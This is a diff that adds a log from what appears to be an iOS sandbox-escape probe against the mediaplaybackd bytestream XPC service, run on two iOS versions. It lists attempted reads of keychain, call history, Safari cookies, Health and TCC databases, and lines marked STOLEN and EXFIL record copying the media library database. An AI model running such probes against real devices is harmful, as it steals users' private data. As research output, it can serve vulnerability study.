@@ -1,0 +1,88 @@
+[+0s] === CoreMedia bytestream readable-domain map (wave-5 probe) ===
+[+0s] device=iPhone os=iOS 26.5 pid=21571
+[+0s] STEP2 connected to mediaplaybackd.bytestream.xpc
+[+0s] STEP3 '.rp1' reply=dictionary
+[+0s] STEP3 '.rp2' recipSt=0 reply=dictionary
+[+0s] STEP3 '.org' beginSt=0 reply=dictionary
+[+0s] STEP3 '.org' completeSt=0 origin=true
+[+0s] CTRL[medialib] direct-open DENIED errno=1 (Operation not permitted)
+[+0s] CTRL[dcim] direct-open DENIED errno=1 (Operation not permitted)
+[+0s] CTRL[mobile-root] direct-open DENIED errno=1 (Operation not permitted)
+[+0s] DENIED[oracle-real] err=-12203 path=/private/var/mobile/Media/iTunes_Control
+[+0s] DENIED[oracle-fake] err=-17913 path=/private/var/mobile/Media/iTunes_Control/mconf_no_such_file_zzz
+[+0s] STREAM[medialib] oid=521020077496082945 len=0 dpid=0 path=/private/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb
+[+0s] STOLEN[medialib] fd=4 size=749568 uid=501 mode=100644 head64=53514c69746520666f726d617420330010000202004020200000000f000000b7000000b70000000300000268000000040000000000000000000000010023dbb0
+[+0s] EXFIL[medialib] 749568B -> Documents/wave5_stolen_medialib.bin
+[+0s] DENIED[mobile-root] err=-12203 path=/private/var/mobile
+[+0s] DENIED[media-root] err=-12203 path=/private/var/mobile/Media
+[+0s] DENIED[library] err=-12203 path=/private/var/mobile/Library
+[+0s] DENIED[dcim] err=-12203 path=/private/var/mobile/Media/DCIM
+[+0s] DENIED[books] err=-12203 path=/private/var/mobile/Media/Books
+[+0s] DENIED[photostreams] err=-17913 path=/private/var/mobile/Media/PhotoStreamsData
+[+0s] DENIED[recordings] err=-12203 path=/private/var/mobile/Media/Recordings
+[+0s] DENIED[podcasts] err=-17913 path=/private/var/mobile/Media/Podcasts
+[+0s] DENIED[books] err=-12203 path=/private/var/mobile/Media/Books
+[+0s] DENIED[itunes-ctrl] err=-12203 path=/private/var/mobile/Media/iTunes_Control
+[+0s] DENIED[itunes-parent] err=-12203 path=/private/var/mobile/Media/iTunes_Control
+[+0s] DENIED[wallpaper] err=-12203 path=/private/var/mobile/Library/Wallpaper
+[+0s] DENIED[callhistory] err=-12203 path=/private/var/mobile/Library/CallHistoryDB/CallHistory.storedata
+[+0s] DENIED[restrictions-pw] err=-12203 path=/private/var/mobile/Library/Preferences/com.apple.restrictionspassword.plist
+[+0s] DENIED[notes-ag] err=-17913 path=/private/var/mobile/Containers/Shared/AppGroup/group.com.apple.notes/NoteStore.sqlite
+[+0s] DENIED[safari-cookies] err=-17913 path=/private/var/mobile/Library/Cookies/Cookies.binarycookies
+[+0s] DENIED[safari] err=-12203 path=/private/var/mobile/Library/Safari
+[+0s] DENIED[tcc] err=-12203 path=/private/var/mobile/Library/TCC/TCC.db
+[+0s] DENIED[keychain] err=-12203 path=/private/var/Keychains/keychain-2.db
+[+0s] DENIED[health] err=-12203 path=/private/var/mobile/Library/Health
+[+0s] DENIED[health2] err=-17913 path=/private/var/mobile/Library/com.apple.Health
+[+0s] DENIED[passes] err=-12203 path=/private/var/mobile/Library/Passes
+[+0s] DENIED[coreduet] err=-12203 path=/private/var/mobile/Library/CoreDuet
+[+0s] DENIED[preferences] err=-12203 path=/private/var/mobile/Library/Preferences
+[+0s] DENIED[containers-app] err=-12203 path=/private/var/mobile/Containers/Data/Application
+[+0s] DENIED[containers-group] err=-12203 path=/private/var/mobile/Containers/Shared/AppGroup
+[+0s] DENIED[caches] err=-12203 path=/private/var/mobile/Library/Caches
+[+0s] DCIM-CHAIN daemon refused DCIM dir fd
+[+0s] === END ===
+[+0s] === CoreMedia bytestream readable-domain map (wave-5 probe) ===
+[+0s] device=iPhone os=iOS 27.0 pid=16659
+[+0s] STEP2 connected to mediaplaybackd.bytestream.xpc
+[+0s] STEP3 '.rp1' reply=dictionary
+[+0s] STEP3 '.rp2' recipSt=0 reply=dictionary
+[+0s] STEP3 '.org' beginSt=0 reply=dictionary
+[+0s] STEP3 '.org' completeSt=0 origin=true
+[+0s] CTRL[medialib] direct-open DENIED errno=1 (Operation not permitted)
+[+0s] CTRL[dcim] direct-open DENIED errno=1 (Operation not permitted)
+[+0s] CTRL[mobile-root] direct-open DENIED errno=1 (Operation not permitted)
+[+0s] DENIED[oracle-real] err=-12203 path=/private/var/mobile/Media/iTunes_Control
+[+0s] DENIED[oracle-fake] err=-17913 path=/private/var/mobile/Media/iTunes_Control/mconf_no_such_file_zzz
+[+0s] STREAM[medialib] oid=965211780001319937 len=0 dpid=0 path=/private/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb
+[+0s] STOLEN[medialib] fd=4 size=835584 uid=501 mode=100644 head64=53514c69746520666f726d6174203300100002020040202000000007000000cc000000c700000003000001560000000400000000000000000000000100249f3c
+[+0s] EXFIL[medialib] 835584B -> Documents/wave5_stolen_medialib.bin
+[+0s] DENIED[mobile-root] err=-12203 path=/private/var/mobile
+[+0s] DENIED[media-root] err=-12203 path=/private/var/mobile/Media
+[+0s] DENIED[library] err=-12203 path=/private/var/mobile/Library
+[+0s] DENIED[dcim] err=-12203 path=/private/var/mobile/Media/DCIM
+[+0s] DENIED[books] err=-12203 path=/private/var/mobile/Media/Books
+[+0s] DENIED[photostreams] err=-17913 path=/private/var/mobile/Media/PhotoStreamsData
+[+0s] DENIED[recordings] err=-17913 path=/private/var/mobile/Media/Recordings
+[+0s] DENIED[podcasts] err=-17913 path=/private/var/mobile/Media/Podcasts
+[+0s] DENIED[books] err=-12203 path=/private/var/mobile/Media/Books
+[+0s] DENIED[itunes-ctrl] err=-12203 path=/private/var/mobile/Media/iTunes_Control
+[+0s] DENIED[itunes-parent] err=-12203 path=/private/var/mobile/Media/iTunes_Control
+[+0s] DENIED[wallpaper] err=-12203 path=/private/var/mobile/Library/Wallpaper
+[+0s] DENIED[callhistory] err=-12203 path=/private/var/mobile/Library/CallHistoryDB/CallHistory.storedata
+[+0s] DENIED[restrictions-pw] err=-12203 path=/private/var/mobile/Library/Preferences/com.apple.restrictionspassword.plist
+[+0s] DENIED[notes-ag] err=-17913 path=/private/var/mobile/Containers/Shared/AppGroup/group.com.apple.notes/NoteStore.sqlite
+[+0s] DENIED[safari-cookies] err=-17913 path=/private/var/mobile/Library/Cookies/Cookies.binarycookies
+[+0s] DENIED[safari] err=-12203 path=/private/var/mobile/Library/Safari
+[+0s] DENIED[tcc] err=-12203 path=/private/var/mobile/Library/TCC/TCC.db
+[+0s] DENIED[keychain] err=-12203 path=/private/var/Keychains/keychain-2.db
+[+0s] DENIED[health] err=-12203 path=/private/var/mobile/Library/Health
+[+0s] DENIED[health2] err=-17913 path=/private/var/mobile/Library/com.apple.Health
+[+0s] DENIED[passes] err=-12203 path=/private/var/mobile/Library/Passes
+[+0s] DENIED[coreduet] err=-12203 path=/private/var/mobile/Library/CoreDuet
+[+0s] DENIED[preferences] err=-12203 path=/private/var/mobile/Library/Preferences
+[+0s] DENIED[containers-app] err=-12203 path=/private/var/mobile/Containers/Data/Application
+[+0s] DENIED[containers-group] err=-12203 path=/private/var/mobile/Containers/Shared/AppGroup
+[+0s] DENIED[caches] err=-12203 path=/private/var/mobile/Library/Caches
+[+0s] DCIM-CHAIN daemon refused DCIM dir fd
+[+0s] === END ===
